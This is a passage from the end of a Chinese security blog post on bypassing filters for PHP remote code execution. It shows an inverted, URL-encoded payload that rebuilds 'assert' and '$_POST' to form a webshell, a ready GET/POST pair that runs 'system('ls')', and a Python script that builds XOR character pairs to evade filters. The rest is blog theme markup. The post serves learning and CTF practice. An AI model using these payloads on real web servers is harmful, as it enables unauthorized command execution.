+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span> = <span class="hljs-string">&quot;assert&quot;</span>;<br><span class="hljs-variable">$__</span> = <span class="hljs-string">&quot;_POST&quot;</span>;<br><span class="hljs-variable">$___</span> = <span class="hljs-variable">$_POST</span>;<br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;_&#x27;</span>]);<br></code></pre></td></tr></table></figure>
+
+<p>即为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>=~(%<span class="hljs-number">9</span>E%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>C%<span class="hljs-number">9</span>A%<span class="hljs-number">8</span>D%<span class="hljs-number">8</span>B);    <span class="hljs-comment">// 1. URL解码并取反</span><br><span class="hljs-variable">$__</span>=~(%A0%AF%B0%AC%AB);      <span class="hljs-comment">// 2. URL解码并取反</span><br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$$__</span>;                   <span class="hljs-comment">// 3. 变量变量</span><br><span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]);                 <span class="hljs-comment">// 4. 函数调用</span><br></code></pre></td></tr></table></figure>
+
+<p>那么我可以传参</p>
+<p>GET:<code>?shell=$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[_]);</code></p>
+<p>POST:<code>_=system(&#39;ls&#39;);</code></p>
+<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p> 这里有一个异或构造的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">valid = <span class="hljs-string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span><br><br>answer = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入进行异或构造的字符串：&quot;</span>))<br><br>tmp1, tmp2 = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> answer:<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> valid:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> valid:<br>      <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ord</span>(i) ^ <span class="hljs-built_in">ord</span>(j) == <span class="hljs-built_in">ord</span>(c)):<br>        tmp1 += i<br>        tmp2 += j<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>      <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tmp1为:&quot;</span>,tmp1)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tmp2为:&quot;</span>,tmp2)<br><br><span class="hljs-comment">#请输入进行异或构造的字符串：system(&#x27;ls&#x27;);</span><br><span class="hljs-comment"># tmp1为: 39348213@</span><br><span class="hljs-comment"># tmp2为: @@@@]_]@&#123;</span><br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/web%E5%AD%A6%E4%B9%A0/" class="category-chain-item">web学习</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+        <a href="/tags/RCE/" class="print-no-link">#RCE</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>浅谈RCE绕过姿势</div>
+      <div>https://kivvs.github.io/2026/08/14/浅谈RCE绕过姿势/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>kivvs</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年8月14日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/08/14/sql%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%A6%81/" title="sql学习概要">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">sql学习概要</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/08/14/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" title="深入解析SSTI模板注入">
+                        <span class="hidden-mobile">深入解析SSTI模板注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"kivvs/kivvs.github.io","repo-id":"R_kgDOT3J6Jg","category":"Announcements","category-id":"DIC_kwDOT3J6Js4DDSMc","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid- /hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/openkounter.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
